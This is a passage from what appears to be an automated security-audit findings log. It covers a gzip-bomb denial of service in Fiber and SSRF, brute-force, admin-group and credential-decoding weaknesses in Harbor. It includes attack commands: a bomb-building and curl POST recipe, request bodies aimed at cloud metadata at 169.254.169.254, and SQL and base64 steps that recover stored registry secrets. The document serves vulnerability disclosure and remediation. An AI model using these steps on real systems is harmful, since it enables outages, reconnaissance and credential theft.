response | 52 428 800 bytes (50 MiB) |\n| Heap delta | **+92.3 MiB** |\n| Amplification ratio | ~300 000:1 (wire bytes to heap bytes) |\n\nExit code `2` was returned by the PoC process, confirming the VULNERABLE verdict path was\ntaken. Full output is in `evidence/results.txt`.\n\n---\n\n## Attack Scenario\n\n1. Attacker prepares a gzip bomb: `dd if=/dev/zero bs=1M count=50 | gzip -9 \u003e bomb.gz`\n   -- a ~50 KiB file that decompresses to 50 MiB.\n2. Sends a single unauthenticated POST to any endpoint:\n   ```\n   curl -X POST https://target/any \\\n     -H \"Content-Encoding: gzip\" \\\n     --data-binary @bomb.gz\n   ```\n3. Server allocates ~92 MiB per request; with concurrent requests the process OOM-kills.\n4. For chained amplification: double-compress (`gzip \u003c bomb.gz \u003e bomb2.gz`, 0.3 KiB)\n   and send with `Content-Encoding: gzip, gzip`. Same heap cost, 1/150th the bandwidth.\n\nNo credentials, session tokens, or prior knowledge of the application are required.\n\n---\n\n## Impact\n\n- **Availability (HIGH)**: Remotely triggered memory exhaustion crashes the server process.\n  A single attacker with low bandwidth can sustain attack (0.3 KiB per 92 MiB allocation).\n- **Scope**: All Fiber v3 applications that call `c.Body()`, `c.BodyParser()`, or any\n  binding method (`Bind.JSON()`, `Bind.Form()`, `Bind.XML()`, `Bind.MsgPack()`,\n  `Bind.CBOR()`) are affected. This covers the vast majority of Fiber deployments.\n- **No auth required**: Pre-authentication attack surface.\n- **Compound risk**: Combined with the TrustProxy IP spoofing finding (p8-006), rate\n  limiting based on client IP is ineffective.\n\n---\n\n## Recommended Fix\n\nReplace all four unlimited decompression calls in `req.go:tryDecodeBodyInOrder` with\ntheir size-limited equivalents, passing `r.c.app.config.BodyLimit` as the cap:\n\n```go\n// req.go:110-118 -- PROPOSED FIX\nmaxDecompressed := r.c.app.config.BodyLimit\nswitch encoding {\ncase StrGzip, \"x-gzip\":\n    body, decodeErr = request.BodyGunzipWithLimit(maxDecompressed)\ncase StrBr, StrBrotli:\n    body, decodeErr = request.BodyUnbrotliWithLimit(maxDecompressed)\ncase StrDeflate:\n    body, decodeErr = request.BodyInflateWithLimit(maxDecompressed)\ncase StrZstd:\n    body, decodeErr = request.BodyUnzstdWithLimit(maxDecompressed)\n```\n\nThis ensures the decompressed output is bounded by the same limit the operator configured\nfor the compressed input.\n\nA separate `DecompressedBodyLimit` configuration field is preferable for applications\nthat need to accept larger compressed payloads than decompressed ones, but the\n`BodyLimit`-cap fix is immediately safe and backward-compatible.\n\n---\n\n## References\n\n- `req.go:100-142` -- `tryDecodeBodyInOrder`\n- `req.go:112` -- `request.BodyGunzip()`\n- `fasthttp/http.go:494-503` -- `BodyGunzip` -\u003e `BodyGunzipWithLimit(0)`\n- `app.go:1345` -- `BodyLimit` applied to compressed wire size only\n- `evidence/poc.go` -- self-contained exploit\n- `evidence/results.txt` -- execution output\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"gofiber/fiber","finding_hash":"4669d92185335414bf4578759a8ebcb5","found_at":"2026-04-12T09:28:43.962269Z","created_at":"2026-04-12T09:28:43Z"}}],

",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"registry-ping-ssrf\\",\\"description\\":\\"## Summary\\\\n\\\\nThe `PingRegistry` handler at `POST /api/v2.0/registries/ping` accepts a user-supplied registry URL, passes it through `ValidateHTTPURL` (scheme-only validation, no IP filtering), then invokes `IsHealthy` which creates a registry adapter and calls `HealthCheck()` — ultimately making one or more outbound HTTP requests to the attacker-controlled URL. The error response differentiates between connection refused, timeout, and parse error, providing an internal-network port scanning oracle. The same flow applies to `CreateRegistry` and `UpdateRegistry` which also call `c.validate()` → `IsHealthy`.\\\\n\\\\nUnlike `PingScanner` (p8-029), the registry ping can authenticate to the target endpoint using user-supplied credentials (`access_key`, `access_secret`), amplifying the impact to authenticated internal SSRF.\\\\n\\\\n## Location\\\\n\\\\n- `src/server/v2.0/handler/registry.go:225-292` — `PingRegistry` accepts URL, calls `ValidateHTTPURL` then `IsHealthy`\\\\n- `src/server/v2.0/handler/registry.go:46-77` — `CreateRegistry` calls `r.ctl.Create` which validates then probes\\\\n- `src/controller/registry/controller.go:88-110` — `validate()` calls `ValidateHTTPURL` (scheme-only) then `IsHealthy`\\\\n- `src/controller/registry/controller.go:172-182` — `IsHealthy` creates adapter and calls `HealthCheck()`\\\\n- `src/pkg/reg/adapter/native/adapter.go:118-131` — `HealthCheck` calls `Ping()` making HTTP GET to registry URL\\\\n- `src/lib/endpoint.go:27-45` — `ValidateHTTPURL` validates scheme only, no IP filtering\\\\n\\\\n## Attacker Control\\\\n\\\\n- System admin controls registry URL via `POST /api/v2.0/registries/ping` with body `{\\\\\\"url\\\\\\": \\\\\\"http://169.254.169.254/\\\\\\", \\\\\\"type\\\\\\": \\\\\\"harbor\\\\\\"}`\\\\n- URL passes `ValidateHTTPURL` (http/https scheme accepted, no IP filtering)\\\\n- Credentials `access_key`/`access_secret` passed as BasicAuth to the target — enables authenticated internal SSRF\\\\n- `insecure: true` bypasses TLS certificate verification\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\n- TB-8: Core API container to any HTTP-reachable host on the internal network\\\\n- System admin privilege escalates to internal network HTTP reconnaissance with credential injection\\\\n\\\\n## Impact\\\\n\\\\n- Internal service discovery via error-based oracle (connection refused vs. timeout)\\\\n- Cloud metadata credential theft (`http://169.254.169.254/latest/meta-data/`)\\\\n- Authenticated SSRF: user-supplied credentials forwarded as BasicAuth to internal endpoints\\\\n- TLS bypass via `insecure: true` enables targeting self-signed internal HTTPS services\\\\n\\\\n## Evidence\\\\n\\\\n- `registry.go:243`: `lib.ValidateHTTPURL(*params.Registry.URL)` — scheme-only validation\\\\n- `controller.go:95`: `lib.ValidateHTTPURL(registry.URL)` — same scheme-only check in validate()\\\\n- `controller.go:101`: `c.IsHealthy(ctx, registry)` — makes outbound HTTP request\\\\n- `endpoint_test.go:32-33`: `http://127.0.0.1` and `http://169.254.169.254` pass ValidateHTTPURL\\\\n- Pattern matches AP-022: ValidateHTTPURL as sole URL validation before HTTP request\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Authenticate as system administrator\\\\n2. Send: `POST /api/v2.0/registries/ping` with body:\\\\n   `{\\\\\\"url\\\\\\": \\\\\\"http://169.254.169.254/latest/meta-data/\\\\\\", \\\\\\"type\\\\\\": \\\\\\"harbor\\\\\\", \\\\\\"insecure\\\\\\": true}`\\\\n3. Observe error response: timeout (host unreachable), connection refused (port closed), or registry error (port open)\\\\n4. Iterate across internal IPs/ports to map internal network\\\\n5. For authenticated SSRF: include `credential_type`, `access_key`, `access_secret` in body\\\\n\\",\\"severity\\":\\"medium\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-10\\",\\"valid\\",\\"poc-pending\\"],\\"status\\":\\"open\\",\\"cvss_score\\":0,\\"finding_hash\\":\\"7acf6bbb9d4b016fe6fd05abc78a9a97\\",\\"found_at\\":\\"2026-03-30T18:45:41.016111Z\\",\\"created_at\\":\\"2026-03-30T18:45:41Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":2,\\"project_uuid\\":\\"00000000-0000-0000-0000-000000000001\\",\\"http_record_uuids\\":[],\\"agent_run_uuid\\":\\"59ad48a0-3a26-43d3-b425-70ed9fbdf240\\",\\"module_id\\":\\"archon:p10-002\\",\\"module_name\\":\\"The `PingOIDC` handler at `POST /api/v2.0/system/oidc/ping` accepts a user-supplied OIDC endpoint URL and calls `oidcpkg.TestEndpoint(conn)` → `gooidc.NewProvider(ctx, conn.URL)`. The go-oidc librar\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"oidc-ping-ssrf\\",\\"description\\":\\"## Summary\\\\n\\\\nThe `PingOIDC` handler at `POST /api/v2.0/system/oidc/ping` accepts a user-supplied OIDC endpoint URL and calls `oidcpkg.TestEndpoint(conn)` → `gooidc.NewProvider(ctx, conn.URL)`. The go-oidc library immediately issues an outbound HTTP GET to `{url}/.well-known/openid-configuration` to fetch the OIDC discovery document. There is no IP filtering, no `ValidateHTTPURL` call, and no allowlist check applied to the URL before the outbound request. The `verify_cert: false` option additionally enables TLS bypass.\\\\n\\\\nUnlike scanner and registry ping endpoints, PingOIDC appends a fixed path suffix (`/.well-known/openid-configuration`), limiting the attacker to error-based oracle (similar to PingScanner\'s fixed `/api/v1/metadata` suffix). However, the fixed suffix is predictable and any server responding to that path will trigger further requests.\\\\n\\\\n## Location\\\\n\\\\n- `src/server/v2.0/handler/oidc.go:37-51` — `PingOIDC` accepts URL, passes to `TestEndpoint`\\\\n- `src/pkg/oidc/helper.go:505-512` — `TestEndpoint` calls `gooidc.NewProvider(ctx, conn.URL)`\\\\n- `src/pkg/oidc/helper.go:86-104` — `providerHelper.create()` uses same pattern for stored OIDC config\\\\n\\\\n## Attacker Control\\\\n\\\\n- System admin controls the `url` field via `POST /api/v2.0/system/oidc/ping`\\\\n- URL is passed directly to `gooidc.NewProvider` with no IP filtering\\\\n- `verify_cert: false` disables TLS certificate verification\\\\n- Fixed path suffix `/.well-known/openid-configuration` appended — error-based oracle only\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\n- TB-8: Core API container to any HTTP-reachable host on the internal network\\\\n- System admin privilege escalates to internal network HTTP probing\\\\n\\\\n## Impact\\\\n\\\\n- Internal service discovery via error-based oracle\\\\n- Cloud metadata probing via `http://169.254.169.254/.well-known/openid-configuration`\\\\n- TLS bypass via `verify_cert: false` enables targeting internal HTTPS services\\\\n- If a metadata service or internal HTTP server happens to serve the discovery path, full SSRF response disclosure\\\\n\\\\n## Evidence\\\\n\\\\n- `oidc.go:41-43`: `oidcpkg.TestEndpoint(oidcpkg.Conn{URL: params.Endpoint.URL, VerifyCert: params.Endpoint.VerifyCert})` — no URL sanitization before call\\\\n- `helper.go:509-511`: `gooidc.NewProvider(ctx, conn.URL)` — HTTP request made immediately\\\\n- No `ValidateHTTPURL` call in the PingOIDC code path (unlike PingRegistry and PingScanner which at least call scheme validation)\\\\n- Pattern matches AP-022: user-controlled URL as sole input to HTTP client call\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Authenticate as system administrator\\\\n2. Send: `POST /api/v2.0/system/oidc/ping` with body:\\\\n   `{\\\\\\"url\\\\\\": \\\\\\"http://169.254.169.254\\\\\\", \\\\\\"verify_cert\\\\\\": false}`\\\\n3. Observe: go-oidc attempts GET to `http://169.254.169.254/.well-known/openid-configuration`\\\\n4. Response timing/error message reveals open vs. closed vs. filtered port status\\\\n5. Iterate across internal IPs to discover services responding on port 80/443\\\\n\\",\\"severity\\":\\"medium\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-10\\",\\"valid\\",\\"poc-pending\\"],\\"status\\":\\"open\\",\\"cvss_score\\":0,\\"finding_hash\\":\\"6e815ede4793b6e90b3d9698255a0c8e\\",\\"found_at\\":\\"2026-03-30T18:45:41.016112Z\\",\\"created_at\\":\\"2026-03-30T18:45:41Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":3,\\"project_uuid\\":\\"00000000-0000-0000-0000-000000000001\\",\\"http_record_uuids\\":[],\\"agent_run_uuid\\":\\"59ad48a0-3a26-43d3-b425-70ed9fbdf240\\",\\"module_id\\":\\"archon:p10-003\\",\\"module_name\\":\\"The preheat finding (p8-024) documented SSRF through `GetHealth` for Dragonfly and Kraken providers. A structural variant exists in the `Preheat()` and `CheckProgress()` methods of both providers: the\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"kraken-preheat-no-url-revalidation\\",\\"description\\":\\"## Summary\\\\n\\\\nThe preheat finding (p8-024) documented SSRF through `GetHealth` for Dragonfly and Kraken providers. A structural variant exists in the `Preheat()` and `CheckProgress()` methods of both providers: these execution paths use `kd.instance.Endpoint` directly to construct URLs and make HTTP requests without calling `ValidateHTTPURL` at all, even for the scheme check. The Kraken `GetHealth` calls `ValidateHTTPURL` at line 63, but `Preheat()` at line 89 constructs the URL from the same endpoint without validation before calling `client.GetHTTPClient(...).Post(url, ...)`. Dragonfly `Preheat()` at line 268 and `CheckProgress()` at line 297 also skip URL re-validation.\\\\n\\\\nSince the endpoint originates from the stored preheat instance (user-controlled, confirmed in p8-024), the Preheat execution path represents an independent SSRF trigger that fires during artifact push events — increasing the attack surface and triggering frequency compared to the health-check-only path.\\\\n\\\\n## Location\\\\n\\\\n- `src/pkg/p2p/preheat/provider/kraken.go:89-108` — `Preheat()` constructs URL from `kd.instance.Endpoint`, no `ValidateHTTPURL`, HTTP POST made\\\\n- `src/pkg/p2p/preheat/provider/dragonfly.go:268-269` — `Preheat()` constructs URL from `dd.instance.Endpoint`, no `ValidateHTTPURL`, HTTP POST\\\\n- `src/pkg/p2p/preheat/provider/dragonfly.go:297-298` — `CheckProgress()` constructs URL, no `ValidateHTTPURL`, HTTP GET\\\\n- `src/controller/p2p/preheat/controller.go:195` — `CreateInstance` stores endpoint without validation (confirmed p8-024)\\\\n\\\\n## Attacker Control\\\\n\\\\n- System admin creates preheat instance with malicious endpoint via `POST /api/v2.0/p2p/preheat/instances`\\\\n- Endpoint stored in DB as confirmed in p8-024\\\\n- `Preheat()` triggered automatically on artifact push matching preheat policy — no further admin action needed\\\\n- `kd.instance.Insecure = true` disables TLS verification\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\n- TB-8: Job Service / Core container to internal network\\\\n- Automatic trigger on artifact push eliminates the need for manual health-check initiation\\\\n\\\\n## Impact\\\\n\\\\n- Same as p8-024: cloud metadata credential theft, internal service discovery\\\\n- Additional trigger vector: Preheat fires on every artifact push matching the policy, enabling high-frequency probing\\\\n- No scheme validation in Preheat path — technically allows non-http schemes if instance endpoint was stored with ftp:// or other scheme (CreateInstance only warns health check, doesn\'t validate endpoint format rigorously)\\\\n\\\\n## Evidence\\\\n\\\\n- `kraken.go:63`: `url, err := lib.ValidateHTTPURL(url)` present in `GetHealth()` only\\\\n- `kraken.go:89`: `url := fmt.Sprintf(\\\\\\"%s%s\\\\\\", strings.TrimSuffix(kd.instance.Endpoint, \\\\\\"/\\\\\\"), krakenPreheatPath)` — no ValidateHTTPURL before HTTP call\\\\n- `dragonfly.go:268`: same pattern in `Preheat()` — no revalidation\\\\n- `dragonfly.go:297`: same in `CheckProgress()`\\\\n- Instance endpoint user-controlled per p8-024 evidence\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Authenticate as system administrator\\\\n2. Create preheat instance: `POST /api/v2.0/p2p/preheat/instances` with `{\\\\\\"endpoint\\\\\\": \\\\\\"http://169.254.169.254/\\\\\\", \\\\\\"vendor\\\\\\": \\\\\\"kraken\\\\\\", \\\\\\"name\\\\\\": \\\\\\"test\\\\\\", \\\\\\"insecure\\\\\\": true}`\\\\n3. Create preheat policy for a project targeting this instance\\\\n4. Push any artifact matching the policy filter\\\\n5. `KrakenDriver.Preheat()` executes HTTP POST to `http://169.254.169.254/registry/notifications` — bypasses even scheme check in execution path\\\\n\\",\\"severity\\":\\"medium\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-10\\",\\"valid\\",\\"poc-pending\\"],\\"status\\":\\"open\\",\\"cvss_score\\":0,\\"finding_hash\\":\\"b8a2815977c082234f33a47c89b042c1\\",\\"found_at\\":\\"2026-03-30T18:45:41.016113Z\\",\\"created_at\\":\\"2026-03-30T18:45:41Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":4,\\"project_uuid\\":\\"00000000-0000-0000-0000-000000000001\\",\\"http_record_uuids\\":[],\\"agent_run_uuid\\":\\"59ad48a0-3a26-43d3-b425-70ed9fbdf240\\",\\"module_id\\":\\"archon:p10-020\\",\\"module_name\\":\\"Harbor\'s OIDC CLI secret authentication path (`oidc_cli.go:72`) calls `oidc.VerifySecret` which performs a plaintext secret comparison with no rate limiting, no lockout, and no delay on failure. This \\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"oidc-cli-secret-no-brute-force\\",\\"description\\":\\"## Summary\\\\n\\\\nHarbor\'s OIDC CLI secret authentication path (`oidc_cli.go:72`) calls `oidc.VerifySecret` which performs a plaintext secret comparison with no rate limiting, no lockout, and no delay on failure. This is structurally identical to the confirmed robot account brute-force gap (p8-009): the human account path via `basicAuth.Generate` -> `auth.Login` has `lock.IsLocked` + `lock.Lock` + `time.Sleep(1.5s)`, but the OIDC CLI path bypasses all of these. OIDC CLI secrets are randomly generated via `utils.GenerateRandomString()` providing good entropy, but the complete absence of throttling removes defense-in-depth and leaves the endpoint unprotected against automated attacks.\\\\n\\\\n## Location\\\\n\\\\n- `src/server/middleware/security/oidc_cli.go:72` -- `oidc.VerifySecret(ctx, username, secret)` called with no preceding lock check\\\\n- `src/pkg/oidc/secret.go:86-139` -- `VerifySecret` does a string comparison with no sleep, no lock\\\\n- `src/core/auth/authenticator.go:151-160` -- human account path has lock and 1.5s sleep (absent in OIDC CLI path)\\\\n\\\\n## Attacker Control\\\\n\\\\nThe attacker controls HTTP Basic Auth credentials with a valid OIDC username and guessed CLI secret. The username can be harvested through the Harbor UI (project members, users endpoint). CLI secrets are managed by users via the Harbor UI profile page and are used in CI/CD Docker login commands.\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\nExternal network -> OIDC CLI secret authentication. CLI secrets are used by CI/CD pipelines for artifact registry operations. A compromised CLI secret allows the attacker to push/pull artifacts or trigger replication, potentially enabling supply-chain attacks.\\\\n\\\\n## Impact\\\\n\\\\n- Unlimited online guessing against OIDC user CLI secrets\\\\n- No sleep, no lockout, no counter: requests processed at full server throughput\\\\n- OIDC CLI secrets are used for container registry operations (docker login) -- compromise enables supply-chain attacks equivalent to robot account compromise\\\\n- Contrast: human web login has per-process lockout (5 attempts per 1.5s window), robot accounts have no limit (p8-009), OIDC CLI secrets also have no limit\\\\n- The `oidc_cli.valid()` filter restricts paths (only `/v2`, `/service/token`, etc.), but these are exactly the paths used for automated tooling\\\\n\\\\n## Evidence\\\\n\\\\n```go\\\\n// src/server/middleware/security/oidc_cli.go:48-82\\\\nfunc (o *oidcCli) Generate(req *http.Request) security.Context {\\\\n    username, secret, ok := req.BasicAuth()\\\\n    // ... no lock.IsLocked check ...\\\\n    info, err := oidc.VerifySecret(ctx, username, secret)\\\\n    if err != nil {\\\\n        // NO lock.Lock(), NO time.Sleep()\\\\n        return nil\\\\n    }\\\\n    // ...\\\\n}\\\\n\\\\n// src/core/auth/authenticator.go:151-160 (human account path -- has protection)\\\\nif lock.IsLocked(m.Principal) {\\\\n    return nil, nil\\\\n}\\\\n// ... on failure:\\\\nlock.Lock(m.Principal)\\\\ntime.Sleep(frozenTime)  // 1.5s sleep absent in OIDC CLI path\\\\n```\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Identify an OIDC user account (via Harbor UI or `/api/v2.0/users`)\\\\n2. Have that user generate a CLI secret via the Harbor UI profile page\\\\n3. Send rapid sequential Basic Auth requests to `/v2/` with `username:<guess>` at full speed\\\\n4. Observe no rate limiting, no lockout, no per-attempt delay\\\\n5. Compare with human account login: observe 1.5s sleep on each failure and lockout\\\\n6. Recommended fix: Apply the same `UserLock` mechanism used for basic auth to the OIDC CLI secret path\\\\n\\",\\"severity\\":\\"medium\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-10\\",\\"valid\\",\\"poc-pending\\"],\\"status\\":\\"open\\",\\"cvss_score\\":0,\\"source_file\\":\\"src/server/middleware/security/oidc_cli.go:72\\",\\"matched_at\\":[\\"src/server/middleware/security/oidc_cli.go:72\\",\\"src/pkg/oidc/secret.go:86-139\\",\\"src/core/auth/authenticator.go:151-160\\"],\\"finding_hash\\":\\"e740e9ac22da2bc2749c9cac2ee6dc26\\",\\"found_at\\":\\"2026-03-30T18:45:41.016114Z\\",\\"created_at\\":\\"2026-03-30T18:45:41Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":5,\\"project_uuid\\":\\"00000000-0000-0000-0000-000000000001\\",\\"http_record_uuids\\":[],\\"agent_run_uuid\\":\\"59ad48a0-3a26-43d3-b425-70ed9fbdf240\\",\\"module_id\\":\\"archon:p10-021\\",\\"module_name\\":\\"Harbor\'s HTTP AuthProxy integration assigns system admin privileges based on raw group membership from the k8s TokenReview response without any group filter. The `UserFromReviewStatus` function at `ht\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"authproxy-admin-group-no-filter\\",\\"description\\":\\"## Summary\\\\n\\\\nHarbor\'s HTTP AuthProxy integration assigns system admin privileges based on raw group membership from the k8s TokenReview response without any group filter. The `UserFromReviewStatus` function at `http.go:122-133` checks if any of the user\'s raw groups from `status.User.Groups` matches any configured `AdminGroups` value. Unlike the OIDC path which has a `GroupFilter` regex (albeit misapplied per p8-002), the authproxy path has no group filter concept at all. A compromised k8s token review endpoint or a misconfigured cluster can grant any user Harbor system admin by including the `admin_groups` string in the TokenReview groups claim. The authproxy `AdminGroups` and `AdminUsernames` configuration values are stored as plain `StringType` (not filtered or validated), and all groups from the TokenReview are directly populated into the Harbor DB and used for admin role assignment in a single operation.\\\\n\\\\n## Location\\\\n\\\\n- `src/pkg/authproxy/http.go:99-136` -- `UserFromReviewStatus` applies `adminGroups` check against raw `status.User.Groups` with no filter\\\\n- `src/pkg/authproxy/http.go:114-116` -- all groups from token review are populated to DB without filtering\\\\n- `src/server/middleware/security/auth_proxy.go:84` -- caller passes raw `httpAuthProxyConf.AdminGroups` from config\\\\n\\\\n## Attacker Control\\\\n\\\\nThe attacker controls the k8s TokenReview response groups field. This requires either: (a) a compromised k8s API server or token review endpoint, (b) a misconfigured `HTTPAuthProxyTokenReviewEndpoint` pointing at an attacker-controlled server (facilitated by the StringType URL validation gap in p8-027), or (c) a rogue k8s cluster configured as Harbor\'s auth proxy. The `AdminGroups` value is a Harbor configuration string, discoverable from Harbor configuration API.\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\nHTTP AuthProxy token review response -> Harbor admin role assignment. The token review endpoint is an external system and its groups claim is trusted without any filter constraint, providing no operator control over which groups can influence the admin role.\\\\n\\\\n## Impact\\\\n\\\\n- System admin privileges granted to any authproxy-authenticated user whose groups claim includes the configured `AdminGroups` value\\\\n- Unlike OIDC which has a partial filter (albeit broken for admin), authproxy has zero group filtering\\\\n- All groups from the token review are also inserted into Harbor\'s `user_group` table (line 116), expanding the attack surface to project-level RBAC via group membership\\\\n- Admin role is assigned on every authenticated request via `user.AdminRoleInAuth = u2.AdminRoleInAuth` in `auth_proxy.go:90`\\\\n\\\\n## Evidence\\\\n\\\\n```go\\\\n// src/pkg/authproxy/http.go:114-133\\\\nif len(status.User.Groups) > 0 {\\\\n    userGroups := model.UserGroupsFromName(status.User.Groups, common.HTTPGroupType)\\\\n    groupIDList, err := usergroup.Mgr.Populate(orm.Context(), userGroups)  // ALL groups inserted, no filter\\\\n    // ...\\\\n    if len(adminGroups) > 0 && !user.AdminRoleInAuth {\\\\n        agm := make(map[string]struct{})\\\\n        for _, ag := range adminGroups {\\\\n            agm[ag] = struct{}{}\\\\n        }\\\\n        for _, ug := range status.User.Groups {  // raw groups, no filter\\\\n            if _, ok := agm[ug]; ok {\\\\n                user.AdminRoleInAuth = true  // admin granted from unfiltered claim\\\\n                break\\\\n            }\\\\n        }\\\\n    }\\\\n}\\\\n\\\\n// Compare: OIDC path has GroupFilter (misapplied per p8-002), AuthProxy has NO filter at all\\\\n```\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Configure Harbor with HTTP AuthProxy mode, set `admin_groups` to \\\\\\"harbor-admins\\\\\\"\\\\n2. Configure a malicious token review endpoint that returns `status.User.Groups = [\\\\\\"harbor-admins\\\\\\"]`\\\\n3. Send a Docker login request to Harbor with a token that the malicious endpoint validates\\\\n4. Observe Harbor grants system admin role via `AdminRoleInAuth = true`\\\\n5. Verify the user can perform admin operations\\\\n6. Recommended fix: Add a `GroupFilter` equivalent to the authproxy configuration and apply it before admin group membership check, analogous to OIDC\'s `GroupFilter` (and fix its application order per p8-002)\\\\n\\",\\"severity\\":\\"medium\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-10\\",\\"valid\\",\\"poc-pending\\"],\\"status\\":\\"open\\",\\"cvss_score\\":0,\\"source_file\\":\\"src/pkg/authproxy/http.go:99-136\\",\\"matched_at\\":[\\"src/pkg/authproxy/http.go:99-136\\",\\"src/pkg/authproxy/http.go:114-116\\",\\"src/server/middleware/security/auth_proxy.go:84\\"],\\"finding_hash\\":\\"70f8bf6f26fa62a8e82f45bfa49e8018\\",\\"found_at\\":\\"2026-03-30T18:45:41.016115Z\\",\\"created_at\\":\\"2026-03-30T18:45:41Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":6,\\"project_uuid\\":\\"00000000-0000-0000-0000-000000000001\\",\\"http_record_uuids\\":[],\\"agent_run_uuid\\":\\"59ad48a0-3a26-43d3-b425-70ed9fbdf240\\",\\"module_id\\":\\"archon:p10-022\\",\\"module_name\\":\\"Harbor\'s replication registry manager (`pkg/reg/manager.go:191`) decrypts registry `access_secret` credentials using `utils.ReversibleDecrypt`, the same function confirmed in p8-011 to fall back to ba\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"registry-credential-base64-fallback\\",\\"description\\":\\"## Summary\\\\n\\\\nHarbor\'s replication registry manager (`pkg/reg/manager.go:191`) decrypts registry `access_secret` credentials using `utils.ReversibleDecrypt`, the same function confirmed in p8-011 to fall back to base64 decoding when the stored value lacks the `<enc-v1>` AES prefix. In Harbor instances upgraded from pre-AES-encryption versions, the `registry` table\'s `access_secret` column may contain legacy base64-encoded registry passwords. These can be decoded without the AES key by anyone with database read access, exposing replication credentials (passwords, API tokens) for all configured external registries (Docker Hub, ECR, GCR, Harbor, etc.). The `lib/encrypt/encrypt.go` wrapper also inherits this fallback, affecting any config `PasswordType` field loaded from the DB via `pkg/config/db/db.go:52`.\\\\n\\\\n## Location\\\\n\\\\n- `src/pkg/reg/manager.go:191` -- `utils.ReversibleDecrypt(secret, secretKey)` with base64 fallback\\\\n- `src/pkg/reg/dao/model.go:34` -- `access_secret` column in `registry` table\\\\n- `src/common/utils/encrypt.go:82-89` -- shared `ReversibleDecrypt` base64 fallback (root cause)\\\\n- `src/lib/encrypt/encrypt.go:81` -- `Instance().Decrypt()` calls same function, affects PasswordType config fields\\\\n- `src/pkg/config/db/db.go:52` -- PasswordType config items decrypted via same path\\\\n\\\\n## Attacker Control\\\\n\\\\nThe attacker needs read access to the PostgreSQL database\'s `registry` table (or `config` table for PasswordType fields). This is the same elevated precondition as p8-011. Reachable via SQL injection, backup exposure, or compromised DB credentials.\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\nDatabase read access -> Plaintext replication credentials. Registry `access_secret` values encrypted before the AES migration are recoverable as base64 without the AES key, exposing credentials for all external registries configured for replication.\\\\n\\\\n## Impact\\\\n\\\\n- Registry credentials (passwords, API tokens) for all legacy replication targets exposed in plaintext (base64 only)\\\\n- Compromised credentials enable: unauthorized image push/pull at target registries, lateral movement to connected registries (ECR, GCR, Docker Hub accounts), and supply-chain attacks via image tampering at replicated registries\\\\n- Also affects PasswordType config fields (LDAP bind password via `lib/encrypt` wrapper) stored before AES migration\\\\n- Registry credentials are long-lived service account credentials -- no automatic rotation\\\\n- Compared to p8-011 (OIDC tokens): registry credentials are static passwords rather than time-limited tokens, potentially worse long-term exposure\\\\n\\\\n## Evidence\\\\n\\\\n```go\\\\n// src/pkg/reg/manager.go:182-196\\\\nfunc decrypt(secret string) (string, error) {\\\\n    if len(secret) == 0 {\\\\n        return \\\\\\"\\\\\\", nil\\\\n    }\\\\n    secretKey, err := config.SecretKey()\\\\n    // ...\\\\n    decrypted, err := utils.ReversibleDecrypt(secret, secretKey)  // base64 fallback applies\\\\n    // ...\\\\n}\\\\n\\\\n// src/common/utils/encrypt.go:82-89 (root cause, same as p8-011)\\\\nfunc ReversibleDecrypt(str, key string) (string, error) {\\\\n    if strings.HasPrefix(str, EncryptHeaderV1) {\\\\n        return decryptAES(strings.TrimPrefix(str, EncryptHeaderV1), key)\\\\n    }\\\\n    return decodeB64(str)  // no AES key needed for legacy records\\\\n}\\\\n```\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Identify a Harbor instance upgraded from a pre-AES-encryption version\\\\n2. Query the `registry` table: `SELECT name, access_key, access_secret FROM registry WHERE access_secret NOT LIKE \'<enc-v1>%\' AND access_secret != \'\'`\\\\n3. For any returned records, base64-decode: `echo \\\\\\"<access_secret_value>\\\\\\" | base64 -d`\\\\n4. Observe plaintext registry password or API token\\\\n5. Use recovered credentials to authenticate to the external registry\\\\n6. Also query `config` table for PasswordType fields: compare `src/lib/config/metadata/metadatalist.go` for `PasswordType` items (e.g., `OIDCClientSecret`, LDAP bind DN password)\\\\n7. Recommended fix: Add a one-time migration script that re-encrypts all legacy base64-encoded records in the `registry` and `config` tables with AES-CFB encryption before next 